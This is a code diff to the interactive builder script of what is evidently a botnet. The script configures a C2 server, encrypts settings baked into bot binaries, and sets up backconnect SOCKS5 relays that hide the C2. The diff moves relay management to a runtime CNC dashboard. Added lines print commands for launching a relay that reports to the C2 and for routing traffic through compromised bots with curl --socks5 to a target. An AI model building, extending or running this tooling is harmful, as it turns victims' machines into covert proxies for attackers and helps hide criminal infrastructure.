@@ -876,15 +876,9 @@ def print_summary(config: dict):
     print(
         f"  {Colors.YELLOW}Protocol:{Colors.RESET}        {Colors.BRIGHT_WHITE}{config.get('protocol_version', 'N/A')}{Colors.RESET}"
     )
-    relay_eps = config.get("relay_endpoints", [])
-    if relay_eps:
-        print(
-            f"  {Colors.YELLOW}Relay Endpoints:{Colors.RESET} {Colors.BRIGHT_WHITE}{', '.join(relay_eps)}{Colors.RESET}"
-        )
-    else:
-        print(
-            f"  {Colors.YELLOW}Relay Endpoints:{Colors.RESET} {Colors.DIM}None (use !socks <relay:port> at runtime){Colors.RESET}"
-        )
+    print(
+        f"  {Colors.YELLOW}Relay Endpoints:{Colors.RESET} {Colors.DIM}Managed via CNC dashboard — add with: !socks <relay:port> or the SOCKS tab{Colors.RESET}"
+    )
     proxy_u = config.get("proxy_user", "")
     proxy_p = config.get("proxy_pass", "")
     print(
@@ -1081,30 +1075,7 @@ def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
     print()
     success(f"C2: {c2_address} | Admin port: {admin_port}")
 
-    # Relay endpoints for backconnect SOCKS5 proxy
-    print(
-        f"\n{Colors.DIM}   Relay servers let bots backconnect for SOCKS5 without exposing the C2.{Colors.RESET}"
-    )
-    print(
-        f"{Colors.DIM}   Deploy relay binary on a VPS: ./relay -key <magic_code> -cp 9001 -sp 1080{Colors.RESET}"
-    )
-    print(
-        f"{Colors.DIM}   Leave blank if you'll specify relay addresses at runtime or open SOCKS5 ports directly on agents.{Colors.RESET}"
-    )
-    print(
-        f"{Colors.YELLOW}   If you don't know what this is, just press Enter to skip it (it's not needed).{Colors.RESET}\n"
-    )
-    relay_input = prompt(
-        "Relay endpoints (comma-separated host:port, or blank to skip)", ""
-    )
-    relay_endpoints = []
-    if relay_input.strip():
-        relay_endpoints = [r.strip() for r in relay_input.split(",") if r.strip()]
-    config["relay_endpoints"] = relay_endpoints
-    if relay_endpoints:
-        success(f"Relay endpoints: {', '.join(relay_endpoints)}")
-    else:
-        info("No pre-configured relay endpoints (use !socks <relay:port> at runtime)")
+    info("Relay endpoints are managed at runtime via the CNC dashboard — add/remove without rebuilding")
 
     # Default SOCKS5 proxy credentials — auto-generated, unique per build
     _chars = string.ascii_letters + string.digits
@@ -1226,18 +1197,7 @@ def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
     else:
         warning("Failed to set debug mode")
 
-    # Update relay endpoints (bot + CNC)
-    if config.get("relay_endpoints"):
-        relay_blob = "\x00".join(config["relay_endpoints"])
-        enc_relay = aes_ctr_encrypt(relay_blob)
-        update_relay_endpoints(bot_path, enc_relay)
-        update_cnc_relay_endpoints(cnc_path, config["relay_endpoints"])
-        success(f"Relay endpoints configured ({len(config['relay_endpoints'])} endpoint(s))")
-    else:
-        # Clear relay endpoints (empty blob)
-        update_relay_endpoints(bot_path, "")
-        update_cnc_relay_endpoints(cnc_path, [])
-        info("No relay endpoints configured")
+    # Relay endpoints are now managed at runtime via the CNC dashboard (cnc/db/relays.json)
 
     # Update default proxy credentials (bot + CNC)
     update_proxy_credentials(bot_path, config["proxy_user"], config["proxy_pass"])
@@ -1442,63 +1402,8 @@ def run_relay_update(base_path: str, cnc_path: str, bot_path: str):
         f"Current Crypt Seed: {Colors.BRIGHT_WHITE}{existing.get('crypt_seed', 'N/A')}{Colors.RESET}"
     )
 
-    # Show current relay endpoints if any
-    config_go_path = os.path.join(bot_path, "config.go")
-    with open(config_go_path, "r") as f:
-        content = f.read()
-    match = re.search(
-        r'var rawRelayEndpoints, _ = hex\.DecodeString\("([0-9a-fA-F]*)"\)', content
-    )
-    current_hex = match.group(1) if match else ""
-    if current_hex:
-        try:
-            current_key = read_current_key(os.path.join(bot_path, "opsec.go"))
-            current_plain = aes_ctr_decrypt_with_key(current_hex, current_key).decode(
-                "utf-8", errors="replace"
-            )
-            current_list = [
-                e for e in current_plain.split("\x00") if e.strip()
-            ]
-            if current_list:
-                info(
-                    f"Current relay endpoints: {Colors.BRIGHT_WHITE}{', '.join(current_list)}{Colors.RESET}"
-                )
-            else:
-                info("Current relay endpoints: (none)")
-        except Exception:
-            info("Current relay endpoints: (could not decrypt)")
-    else:
-        info("Current relay endpoints: (none)")
-
+    info("Relay endpoints are managed at runtime via the CNC dashboard — no baking required")
     print()
-
-    # Step 1: New relay endpoints
-    print_step(1, 2, "Relay Endpoints")
-
-    print(
-        f"{Colors.DIM}   Relay servers let bots backconnect for SOCKS5 without exposing the C2.{Colors.RESET}"
-    )
-    print(
-        f"{Colors.DIM}   Deploy relay binary on a VPS: ./relay -key {existing.get('magic_code', '<magic_code>')}{Colors.RESET}"
-    )
-    print(
-        f"{Colors.DIM}   Enter as many endpoints as you need, comma-separated.{Colors.RESET}"
-    )
-    print(
-        f"{Colors.DIM}   Leave blank to remove all pre-configured relay endpoints.{Colors.RESET}\n"
-    )
-
-    relay_input = prompt(
-        "Relay endpoints (comma-separated host:port, or blank to clear)", ""
-    )
-    relay_endpoints = []
-    if relay_input.strip():
-        relay_endpoints = [r.strip() for r in relay_input.split(",") if r.strip()]
-
-    if relay_endpoints:
-        success(f"Relay endpoints ({len(relay_endpoints)}): {', '.join(relay_endpoints)}")
-    else:
-        info("All relay endpoints cleared (use !socks <relay:port> at runtime)")
 
     # Show current proxy credentials
     current_user_match = re.search(r'var proxyUser\s*=\s*"([^"]*)"', content)
@@ -1532,18 +1437,6 @@ def run_relay_update(base_path: str, cnc_path: str, bot_path: str):
     encrypt_config_blobs(config_go_path, old_key, new_key)
     success("Sensitive string blobs re-encrypted")
 
-    # Patch relay endpoints (bot + CNC)
-    if relay_endpoints:
-        relay_blob = "\x00".join(relay_endpoints)
-        enc_relay = aes_ctr_encrypt(relay_blob)
-        update_relay_endpoints(bot_path, enc_relay)
-        update_cnc_relay_endpoints(cnc_path, relay_endpoints)
-        success(f"Relay endpoints encrypted ({len(relay_endpoints)} endpoint(s))")
-    else:
-        update_relay_endpoints(bot_path, "")
-        update_cnc_relay_endpoints(cnc_path, [])
-        info("Relay endpoints cleared")
-
     # Patch relay binary auth key
     update_relay_config(base_path, existing["magic_code"])
     success("Relay auth key synced")
@@ -1573,14 +1466,9 @@ def run_relay_update(base_path: str, cnc_path: str, bot_path: str):
     )
     print(f"{Colors.BRIGHT_GREEN}{'═' * 60}{Colors.RESET}\n")
 
-    if relay_endpoints:
-        print(
-            f"  {Colors.YELLOW}Relay Endpoints:{Colors.RESET}  {Colors.BRIGHT_WHITE}{', '.join(relay_endpoints)}{Colors.RESET}"
-        )
-    else:
-        print(
-            f"  {Colors.YELLOW}Relay Endpoints:{Colors.RESET}  {Colors.DIM}(none){Colors.RESET}"
-        )
+    print(
+        f"  {Colors.YELLOW}Relay Endpoints:{Colors.RESET}  {Colors.DIM}managed via CNC dashboard (cnc/db/relays.json){Colors.RESET}"
+    )
     print(
         f"  {Colors.YELLOW}Proxy Auth:{Colors.RESET}      {Colors.BRIGHT_WHITE}{proxy_user}:{proxy_pass}{Colors.RESET}"
     )
@@ -1594,13 +1482,8 @@ def run_relay_update(base_path: str, cnc_path: str, bot_path: str):
         f"  {Colors.YELLOW}Certificates:{Colors.RESET}    {Colors.BRIGHT_WHITE}(unchanged){Colors.RESET}"
     )
     print()
-    if relay_endpoints:
-        info(
-            f"Start relay with: ./relay -key {existing.get('magic_code', '<magic_code>')}"
-        )
-        info(
-            f"Connect with: curl --socks5 {relay_endpoints[0].split(':')[0]}:1080 -U {proxy_user}:{proxy_pass} http://target"
-        )
+    info(f"Start relay with: ./relay -name <id> -c2 https://<cnc>/api/relay-report -key {existing.get('magic_code', '<magic_code>')}")
+    info(f"Connect with: curl --socks5 <relay>:1080 -U {proxy_user}:{proxy_pass} http://target")
     warning("Deploy new bot binaries from bins/")
     warning("Existing bots will NOT auto-update - redeploy required")
     print()
